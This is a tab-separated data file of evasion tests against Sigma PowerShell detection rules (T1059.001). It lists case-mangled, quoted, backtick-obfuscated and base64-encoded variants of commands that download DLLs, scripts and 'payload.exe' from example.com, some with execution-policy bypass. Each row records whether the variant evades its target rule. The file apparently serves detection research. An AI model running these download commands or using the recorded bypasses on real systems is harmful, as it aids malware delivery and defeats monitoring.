Technical	Rule_name	Title	Rule_id	Command_match_rule	Commandline_evasion	Excutable	Bypass target rule	Bypass all rule	Trigger rule
t1059.001	proc_creation_win_powershell_download_dll	Potential DLL File Download Via PowerShell Invoke-WebRequest	0f0450f3-8b47-441e-a31b-15a91dc243e2		"powershell.exe -Command ""(New-Object System.Net.WebClient).DownloadFile('http://example.com/test.dll', 'C:\temp\test.dll')"""	TRUE	TRUE	FALSE	PowerShell DownloadFile (8f70ac5f-1f6f-4f8e-b454-db19561216c5); PowerShell DownloadFile (8f70ac5f-1f6f-4f8e-b454-db19561216c5); PowerShell Download Pattern (3b6ab547-8ec2-4991-b9d2-2b06702a48d7); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.001	proc_creation_win_powershell_download_dll	Potential DLL File Download Via PowerShell Invoke-WebRequest	0f0450f3-8b47-441e-a31b-15a91dc243e2		"powershell.exe -coMMand ""(New-Object System.Net.WebClient).DownloadFile('http://example.com/test.dll', 'C:\temp\test.dll')"""	TRUE	TRUE	FALSE	PowerShell DownloadFile (8f70ac5f-1f6f-4f8e-b454-db19561216c5); PowerShell DownloadFile (8f70ac5f-1f6f-4f8e-b454-db19561216c5); PowerShell Download Pattern (3b6ab547-8ec2-4991-b9d2-2b06702a48d7); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.001	proc_creation_win_powershell_download_dll	Potential DLL File Download Via PowerShell Invoke-WebRequest	0f0450f3-8b47-441e-a31b-15a91dc243e2		"powershell.exe -c ""(New-Object System.Net.WebClient).DownloadFile('http://example.com/test.dll', 'C:\temp\test.dll')"""	TRUE	TRUE	FALSE	PowerShell DownloadFile (8f70ac5f-1f6f-4f8e-b454-db19561216c5); PowerShell DownloadFile (8f70ac5f-1f6f-4f8e-b454-db19561216c5); PowerShell Download Pattern (3b6ab547-8ec2-4991-b9d2-2b06702a48d7); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.001	proc_creation_win_powershell_download_dll	Potential DLL File Download Via PowerShell Invoke-WebRequest	0f0450f3-8b47-441e-a31b-15a91dc243e2		"powershell.exe -commAND ""(New-Object System.Net.WebClient).DownloadFile('http://example.com/test.dll', 'C:\temp\test.dll')"""	TRUE	TRUE	FALSE	PowerShell DownloadFile (8f70ac5f-1f6f-4f8e-b454-db19561216c5); PowerShell DownloadFile (8f70ac5f-1f6f-4f8e-b454-db19561216c5); PowerShell Download Pattern (3b6ab547-8ec2-4991-b9d2-2b06702a48d7); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.001	proc_creation_win_powershell_download_dll	Potential DLL File Download Via PowerShell Invoke-WebRequest	0f0450f3-8b47-441e-a31b-15a91dc243e2		"powershell.exe -CoMMANd ""(New-Object System.Net.WebClient).DownloadFile('http://example.com/test.dll', 'C:\temp\test.dll')"""	TRUE	TRUE	FALSE	PowerShell DownloadFile (8f70ac5f-1f6f-4f8e-b454-db19561216c5); PowerShell DownloadFile (8f70ac5f-1f6f-4f8e-b454-db19561216c5); PowerShell Download Pattern (3b6ab547-8ec2-4991-b9d2-2b06702a48d7); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.001	proc_creation_win_powershell_download_dll	Potential DLL File Download Via PowerShell Invoke-WebRequest	0f0450f3-8b47-441e-a31b-15a91dc243e2		"powershell.exe -CommAnd ""(New-Object System.Net.WebClient).DownloadFile('http://example.com/test.dll', 'C:\temp\test.dll')"""	TRUE	TRUE	FALSE	PowerShell DownloadFile (8f70ac5f-1f6f-4f8e-b454-db19561216c5); PowerShell DownloadFile (8f70ac5f-1f6f-4f8e-b454-db19561216c5); PowerShell Download Pattern (3b6ab547-8ec2-4991-b9d2-2b06702a48d7); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.001	proc_creation_win_powershell_download_dll	Potential DLL File Download Via PowerShell Invoke-WebRequest	0f0450f3-8b47-441e-a31b-15a91dc243e2		"powershell.exe /""Command"" ""(New-Object System.Net.WebClient).DownloadFile('http://example.com/test.dll', 'C:\temp\test.dll')"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_download_dll	Potential DLL File Download Via PowerShell Invoke-WebRequest	0f0450f3-8b47-441e-a31b-15a91dc243e2		"powershell.exe -comMand ""(New-Object System.Net.WebClient).DownloadFile('http://example.com/test.dll', 'C:\temp\test.dll')"""	TRUE	TRUE	FALSE	PowerShell DownloadFile (8f70ac5f-1f6f-4f8e-b454-db19561216c5); PowerShell DownloadFile (8f70ac5f-1f6f-4f8e-b454-db19561216c5); PowerShell Download Pattern (3b6ab547-8ec2-4991-b9d2-2b06702a48d7); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.001	proc_creation_win_powershell_download_patterns	PowerShell Download Pattern	3b6ab547-8ec2-4991-b9d2-2b06702a48d7		"powershell.exe -Command ""$client = New-Object System.Net.WebClient; $client.DownloadString('http://example.com/script.ps1')"""	TRUE	TRUE	FALSE	Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.001	proc_creation_win_powershell_download_patterns	PowerShell Download Pattern	3b6ab547-8ec2-4991-b9d2-2b06702a48d7		"powershell.exe -c ""$client = New-Object System.Net.WebClient; $client.DownloadString('http://example.com/script.ps1')"""	TRUE	TRUE	FALSE	Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.001	proc_creation_win_powershell_download_patterns	PowerShell Download Pattern	3b6ab547-8ec2-4991-b9d2-2b06702a48d7		"powershell.exe /""Command"" ""$client = New-Object System.Net.WebClient; $client.DownloadString('http://example.com/script.ps1')"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_download_patterns	PowerShell Download Pattern	3b6ab547-8ec2-4991-b9d2-2b06702a48d7		"powershell.exe -cOMmand ""$client = New-Object System.Net.WebClient; $client.DownloadString('http://example.com/script.ps1')"""	TRUE	TRUE	FALSE	Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.001	proc_creation_win_powershell_download_patterns	PowerShell Download Pattern	3b6ab547-8ec2-4991-b9d2-2b06702a48d7		"powershell.exe -""Command"" ""$client = New-Object System.Net.WebClient; $client.DownloadString('http://example.com/script.ps1')"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_download_patterns	PowerShell Download Pattern	3b6ab547-8ec2-4991-b9d2-2b06702a48d7		"powershell.exe -COmMaNd ""$client = New-Object System.Net.WebClient; $client.DownloadString('http://example.com/script.ps1')"""	TRUE	TRUE	FALSE	Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.001	proc_creation_win_powershell_download_patterns	PowerShell Download Pattern	3b6ab547-8ec2-4991-b9d2-2b06702a48d7		"powershell.exe -coMmaNd ""$client = New-Object System.Net.WebClient; $client.DownloadString('http://example.com/script.ps1')"""	TRUE	TRUE	FALSE	Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.001	proc_creation_win_powershell_download_patterns	PowerShell Download Pattern	3b6ab547-8ec2-4991-b9d2-2b06702a48d7		"powershell.exe -Command ""(New-Object Net.WebC`lient).DownloadString('http://example.com/script.ps1')"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.001	proc_creation_win_powershell_download_patterns	PowerShell Download Pattern	3b6ab547-8ec2-4991-b9d2-2b06702a48d7		"powershell.exe -ComMaNd ""(New-Object Net.WebC`lient).DownloadString('http://example.com/script.ps1')"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.001	proc_creation_win_powershell_download_patterns	PowerShell Download Pattern	3b6ab547-8ec2-4991-b9d2-2b06702a48d7		"powershell.exe -c ""(New-Object Net.WebC`lient).DownloadString('http://example.com/script.ps1')"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.001	proc_creation_win_powershell_download_patterns	PowerShell Download Pattern	3b6ab547-8ec2-4991-b9d2-2b06702a48d7		"powershell.exe -""Command"" ""(New-Object Net.WebC`lient).DownloadString('http://example.com/script.ps1')"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_download_patterns	PowerShell Download Pattern	3b6ab547-8ec2-4991-b9d2-2b06702a48d7		"powershell.exe /""Command"" ""(New-Object Net.WebC`lient).DownloadString('http://example.com/script.ps1')"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_download_patterns	PowerShell Download Pattern	3b6ab547-8ec2-4991-b9d2-2b06702a48d7		"powershell.exe -command ""(New-Object Net.WebC`lient).DownloadString('http://example.com/script.ps1')"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.001	proc_creation_win_powershell_download_patterns	PowerShell Download Pattern	3b6ab547-8ec2-4991-b9d2-2b06702a48d7		"powershell.exe -COmmANd ""(New-Object Net.WebC`lient).DownloadString('http://example.com/script.ps1')"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.001	proc_creation_win_powershell_download_patterns	PowerShell Download Pattern	3b6ab547-8ec2-4991-b9d2-2b06702a48d7		"powershell.exe -commanD ""(New-Object Net.WebC`lient).DownloadString('http://example.com/script.ps1')"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.001	proc_creation_win_powershell_download_patterns	PowerShell Download Pattern	3b6ab547-8ec2-4991-b9d2-2b06702a48d7		"powershell.exe -ExecutionPolicy Bypass -Command ""Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile 'C:\Windows\Temp\payload.exe'"""	TRUE	TRUE	FALSE	Suspicious Invoke-WebRequest Execution (5e3cc4d8-3e68-43db-8656-eaaeefdec9cc); Script Interpreter Execution From Suspicious Folder (1228c958-e64e-4e71-92ad-7d429f4138ba); Script Interpreter Execution From Suspicious Folder (1228c958-e64e-4e71-92ad-7d429f4138ba); Suspicious Script Execution From Temp Folder (a6a39bdb-935c-4f0a-ab77-35f4bbf44d33); Change PowerShell Policies to an Insecure Level (87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.001	proc_creation_win_powershell_download_patterns	PowerShell Download Pattern	3b6ab547-8ec2-4991-b9d2-2b06702a48d7		"powershell.exe -ep Bypass -""Command"" ""Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile 'C:\Windows\Temp\payload.exe'"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_download_patterns	PowerShell Download Pattern	3b6ab547-8ec2-4991-b9d2-2b06702a48d7		"powershell.exe -exECuTIonPolICy Bypass -cOMmand ""Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile 'C:\Windows\Temp\payload.exe'"""	TRUE	TRUE	FALSE	Suspicious Invoke-WebRequest Execution (5e3cc4d8-3e68-43db-8656-eaaeefdec9cc); Script Interpreter Execution From Suspicious Folder (1228c958-e64e-4e71-92ad-7d429f4138ba); Script Interpreter Execution From Suspicious Folder (1228c958-e64e-4e71-92ad-7d429f4138ba); Suspicious Script Execution From Temp Folder (a6a39bdb-935c-4f0a-ab77-35f4bbf44d33); Change PowerShell Policies to an Insecure Level (87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.001	proc_creation_win_powershell_download_patterns	PowerShell Download Pattern	3b6ab547-8ec2-4991-b9d2-2b06702a48d7		"powershell.exe -eXEcuTIoNPOlicy Bypass -comMAnd ""Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile 'C:\Windows\Temp\payload.exe'"""	TRUE	TRUE	FALSE	Suspicious Invoke-WebRequest Execution (5e3cc4d8-3e68-43db-8656-eaaeefdec9cc); Script Interpreter Execution From Suspicious Folder (1228c958-e64e-4e71-92ad-7d429f4138ba); Script Interpreter Execution From Suspicious Folder (1228c958-e64e-4e71-92ad-7d429f4138ba); Suspicious Script Execution From Temp Folder (a6a39bdb-935c-4f0a-ab77-35f4bbf44d33); Change PowerShell Policies to an Insecure Level (87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.001	proc_creation_win_powershell_download_patterns	PowerShell Download Pattern	3b6ab547-8ec2-4991-b9d2-2b06702a48d7		"powershell.exe /""ExecutionPolicy"" Bypass -c ""Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile 'C:\Windows\Temp\payload.exe'"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_download_patterns	PowerShell Download Pattern	3b6ab547-8ec2-4991-b9d2-2b06702a48d7		"powershell.exe -ep Bypass -c ""Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile 'C:\Windows\Temp\payload.exe'"""	TRUE	TRUE	FALSE	Suspicious Invoke-WebRequest Execution (5e3cc4d8-3e68-43db-8656-eaaeefdec9cc); Suspicious PowerShell Parameter Substring (36210e0d-5b19-485d-a087-c096088885f0); Script Interpreter Execution From Suspicious Folder (1228c958-e64e-4e71-92ad-7d429f4138ba); Script Interpreter Execution From Suspicious Folder (1228c958-e64e-4e71-92ad-7d429f4138ba); Suspicious Script Execution From Temp Folder (a6a39bdb-935c-4f0a-ab77-35f4bbf44d33); Change PowerShell Policies to an Insecure Level (87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.001	proc_creation_win_powershell_download_patterns	PowerShell Download Pattern	3b6ab547-8ec2-4991-b9d2-2b06702a48d7		"powershell.exe -ep Bypass -commAnd ""Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile 'C:\Windows\Temp\payload.exe'"""	TRUE	TRUE	FALSE	Suspicious Invoke-WebRequest Execution (5e3cc4d8-3e68-43db-8656-eaaeefdec9cc); Suspicious PowerShell Parameter Substring (36210e0d-5b19-485d-a087-c096088885f0); Script Interpreter Execution From Suspicious Folder (1228c958-e64e-4e71-92ad-7d429f4138ba); Script Interpreter Execution From Suspicious Folder (1228c958-e64e-4e71-92ad-7d429f4138ba); Suspicious Script Execution From Temp Folder (a6a39bdb-935c-4f0a-ab77-35f4bbf44d33); Change PowerShell Policies to an Insecure Level (87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.001	proc_creation_win_powershell_download_patterns	PowerShell Download Pattern	3b6ab547-8ec2-4991-b9d2-2b06702a48d7		"powershell.exe -execuTIoNpoLICY Bypass -COMmand ""Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile 'C:\Windows\Temp\payload.exe'"""	TRUE	TRUE	FALSE	Suspicious Invoke-WebRequest Execution (5e3cc4d8-3e68-43db-8656-eaaeefdec9cc); Script Interpreter Execution From Suspicious Folder (1228c958-e64e-4e71-92ad-7d429f4138ba); Script Interpreter Execution From Suspicious Folder (1228c958-e64e-4e71-92ad-7d429f4138ba); Suspicious Script Execution From Temp Folder (a6a39bdb-935c-4f0a-ab77-35f4bbf44d33); Change PowerShell Policies to an Insecure Level (87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.001	proc_creation_win_powershell_download_patterns	PowerShell Download Pattern	3b6ab547-8ec2-4991-b9d2-2b06702a48d7		"powershell.exe -ep Bypass /""Command"" ""Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile 'C:\Windows\Temp\payload.exe'"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_download_patterns	PowerShell Download Pattern	3b6ab547-8ec2-4991-b9d2-2b06702a48d7		"powershell.exe -ep Bypass -cOmMAND ""Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile 'C:\Windows\Temp\payload.exe'"""	TRUE	TRUE	FALSE	Suspicious Invoke-WebRequest Execution (5e3cc4d8-3e68-43db-8656-eaaeefdec9cc); Suspicious PowerShell Parameter Substring (36210e0d-5b19-485d-a087-c096088885f0); Script Interpreter Execution From Suspicious Folder (1228c958-e64e-4e71-92ad-7d429f4138ba); Script Interpreter Execution From Suspicious Folder (1228c958-e64e-4e71-92ad-7d429f4138ba); Suspicious Script Execution From Temp Folder (a6a39bdb-935c-4f0a-ab77-35f4bbf44d33); Change PowerShell Policies to an Insecure Level (87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.001	proc_creation_win_powershell_encode	Suspicious Execution of Powershell with Base64	fb843269-508c-4b76-8b8d-88679db22ce7		"powershell.exe ""-en""c JABoAG8AcwB0AG4AYQBtAGUA"	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_encode	Suspicious Execution of Powershell with Base64	fb843269-508c-4b76-8b8d-88679db22ce7		"powershell.exe ""-en"" c JABoAG8AcwB0AG4AYQBtAGUA"	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_encode	Suspicious Execution of Powershell with Base64	fb843269-508c-4b76-8b8d-88679db22ce7		"powershell.exe ""-en"""" c JABoAG8AcwB0AG4AYQBtAGUA"	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_encode	Suspicious Execution of Powershell with Base64	fb843269-508c-4b76-8b8d-88679db22ce7		powershell.exe -enc JABoAG8AcwB0AG4AYQBtAGUA -Encoding Unicode	TRUE	TRUE	FALSE	Suspicious Encoded PowerShell Command Line (ca2092a1-c273-4878-9b4b-0d60115bf5ea); Suspicious PowerShell Encoded Command Patterns (b9d9cc83-380b-4ba3-8d8f-60c0e7e2930c); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.001	proc_creation_win_powershell_encode	Suspicious Execution of Powershell with Base64	fb843269-508c-4b76-8b8d-88679db22ce7		"powershell.exe -""enc"" JABoAG8AcwB0AG4AYQBtAGUA -EnCoding Unicode"	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_encode	Suspicious Execution of Powershell with Base64	fb843269-508c-4b76-8b8d-88679db22ce7		powershell.exe -EncodedCommand JABoAG8AcwB0AG4AYQBtAGUA -Encoding Unicode	TRUE	TRUE	FALSE	Suspicious Encoded PowerShell Command Line (ca2092a1-c273-4878-9b4b-0d60115bf5ea); Suspicious PowerShell Encoded Command Patterns (b9d9cc83-380b-4ba3-8d8f-60c0e7e2930c); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.001	proc_creation_win_powershell_encode	Suspicious Execution of Powershell with Base64	fb843269-508c-4b76-8b8d-88679db22ce7		powershell.exe -eNc JABoAG8AcwB0AG4AYQBtAGUA -Encoding Unicode	TRUE	TRUE	FALSE	Suspicious Encoded PowerShell Command Line (ca2092a1-c273-4878-9b4b-0d60115bf5ea); Suspicious PowerShell Encoded Command Patterns (b9d9cc83-380b-4ba3-8d8f-60c0e7e2930c); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.001	proc_creation_win_powershell_encode	Suspicious Execution of Powershell with Base64	fb843269-508c-4b76-8b8d-88679db22ce7		powershell.exe -EncodedCommand JABoAG8AcwB0AG4AYQBtAGUA -EnCOdiNG Unicode	TRUE	TRUE	FALSE	Suspicious Encoded PowerShell Command Line (ca2092a1-c273-4878-9b4b-0d60115bf5ea); Suspicious PowerShell Encoded Command Patterns (b9d9cc83-380b-4ba3-8d8f-60c0e7e2930c); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
